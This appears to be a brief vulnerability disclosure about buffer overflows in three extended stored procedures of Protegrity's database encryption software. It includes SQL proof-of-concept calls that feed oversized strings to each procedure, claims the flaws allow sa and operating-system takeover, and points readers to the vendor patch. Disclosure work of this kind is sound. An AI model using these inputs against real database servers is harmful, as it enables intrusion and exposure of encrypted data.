Subject: Protegrity buffer overflow


Additional details can be found at

There is a company that does encryption of databases
called Protegrty. They use extended stored procedures
to do the encryption and decryption. I tested 3 of the
extended stored procedures and found all 3 vulnerable
to buffer overflows.

DECLARE @test varchar(8000)
SET @test = (SELECT replicate('x',1926))
execute master.dbo.xp_pty_checkusers 'as', @test

DECLARE @test varchar(8000)
SET @test = (SELECT replicate('x',850))
execute master.dbo.xp_pty_insert @test, @test, @test

DECLARE @test varchar(8000)
SET @test = (SELECT replicate('x',850))
execute master.dbo.xp_pty_select @test, @test, @test

These security holes are fully exploitable and would
allow an attacker to perform any of the following:

1)become sa on the box
2)gain control of the operating system
3)decrypt the sensitive data Protegrity is encrypting

If you have this software, contact the vendor for the
patch.
